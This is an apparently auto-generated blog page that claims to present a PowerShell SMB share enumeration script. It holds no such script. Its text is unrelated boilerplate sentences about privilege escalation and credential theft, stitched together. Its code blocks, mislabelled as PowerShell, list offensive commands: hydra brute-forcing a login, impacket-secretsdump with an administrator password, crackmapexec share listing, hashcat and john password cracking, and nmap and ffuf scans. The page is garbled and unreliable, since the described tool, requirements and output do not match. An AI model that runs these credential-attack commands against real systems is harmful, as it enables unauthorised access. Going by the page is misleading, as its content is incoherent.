---
TitleSEO: "SMB Share Enumeration Script in PowerShell | ZureFX"
TitlePost: "SMB Share Enumeration Script — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for smb share enumeration script. Built for security research and automation."
Keywords: "parser, bash, go, scanner, tool, python, powershell"
URL: "https://zurefx.github.io/scripting/script-smb-share-enumeration-script-686.html"
URL_IMAGES: ""
Date: "2025-03-12"
Tags: "Parser, Bash, Go, Scanner, Tool, Python, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-smb-share-enumeration-script-686"
Permalink: "/scripting/script-smb-share-enumeration-script-686.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials. The scheduled task ran with elevated privileges and could be abused for escalation.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `socat`
- `nikto`
- `kerbrute`

## Implementation

### Core Logic

Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Lateral movement was facilitated by reusing discovered credentials across services. The target system was identified as running a vulnerable version of the service.

### Helper Functions

The service was running without proper input validation, leading to injection vulnerabilities. Command injection was possible through unsanitized user input in the search functionality.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.113.65.108 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.74.24.17/FUZZ
```

## Usage

### Basic Usage

The service account had excessive permissions assigned in Active Directory. The application stored sensitive credentials in an unencrypted configuration file.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.78.80.102
nmap -sCV -p389,8443,110 10.99.24.161 -oN scan.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Advanced Options

Network traffic analysis revealed unencrypted communications containing user credentials. The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
crackmapexec smb 10.126.57.168 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p993,110,8080 10.38.12.139 -oN scan.txt
```

## Output

### Example Output

Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism.

```
[+] Scanning target...
[+] Found 15 results
[+] Done in 8.58s
```
